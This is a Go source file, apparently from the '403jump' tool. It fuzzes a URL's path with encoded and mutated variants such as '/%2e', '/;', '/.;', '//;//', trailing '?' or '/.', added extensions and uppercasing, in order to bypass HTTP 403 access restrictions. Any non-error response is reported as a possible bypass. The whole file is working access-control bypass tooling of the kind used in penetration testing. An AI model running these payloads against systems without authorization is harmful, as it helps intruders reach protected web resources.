package module

import (
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"

	"github.com/trap-bytes/403jump/utils"
)

func HttpRequestPathFuzzing(client *http.Client, inputURL, cookie, customHeader string) int64 {
	bypass := int64(0)

	parsedURL, err := url.Parse(inputURL)
	if err != nil {
		fmt.Println("Skipping domain fuzzing due to an error parsing the URL path")
		return 0
	}

	fuzzedpath := fuzzPath(parsedURL.Path)

	for _, path := range fuzzedpath {
		newurl := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, path)
		req, err := http.NewRequest("GET", newurl, nil)
		if err != nil {
			fmt.Printf("Error creating request for %s with %s path: %v\n", inputURL, path, err)
			return 0
		}

		if cookie != "" {
			req.Header.Set("Cookie", cookie)
		}

		if customHeader != "" {
			headerParts := strings.SplitN(customHeader, ":", 2)
			if len(headerParts) == 2 {
				req.Header.Add(strings.TrimSpace(headerParts[0]), strings.TrimSpace(headerParts[1]))
			} else {
				fmt.Printf("Invalid header format: %s\n", customHeader)
			}
		}

		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				fmt.Printf("Timeout error: Request for %s with %s path took too long to complete.\n", inputURL, path)
				continue
			} else {
				fmt.Printf("Error performing request for %s with %s path: %v\n", inputURL, path, err)
				return 0
			}
		}
		defer resp.Body.Close()

		if resp.StatusCode < http.StatusBadRequest {
			bypassMessage := fmt.Sprintf("Possible bypass found for %s Status code: %d\n", newurl, resp.StatusCode)
			coloredMessage := utils.Colorize(bypassMessage, "\033[32m") // Green color
			fmt.Print(coloredMessage)
			bypass++
		}
	}

	return bypass
}

func fuzzPath(path string) []string {
	fuzzPayloads := []string{}
	fuzzPayloads = append(fuzzPayloads, "/%2e"+path)
	fuzzPayloads = append(fuzzPayloads, "/%2f"+path)
	fuzzPayloads = append(fuzzPayloads, "/%ef%bc%8f"+path)
	fuzzPayloads = append(fuzzPayloads, "/"+path)
	fuzzPayloads = append(fuzzPayloads, path+"?")
	fuzzPayloads = append(fuzzPayloads, path+"/")
	fuzzPayloads = append(fuzzPayloads, path+"/.")
	fuzzPayloads = append(fuzzPayloads, "/"+path+"//")
	fuzzPayloads = append(fuzzPayloads, "/."+path+"/..")
	fuzzPayloads = append(fuzzPayloads, "/."+path)
	fuzzPayloads = append(fuzzPayloads, "/;"+path)
	fuzzPayloads = append(fuzzPayloads, "/;"+path)
	fuzzPayloads = append(fuzzPayloads, "/.;"+path)
	fuzzPayloads = append(fuzzPayloads, "//;//"+path)
	fuzzPayloads = append(fuzzPayloads, "/*"+path)
	fuzzPayloads = append(fuzzPayloads, path+".json")
	fuzzPayloads = append(fuzzPayloads, path+".html")
	fuzzPayloads = append(fuzzPayloads, strings.ToUpper(path))

	return fuzzPayloads
}
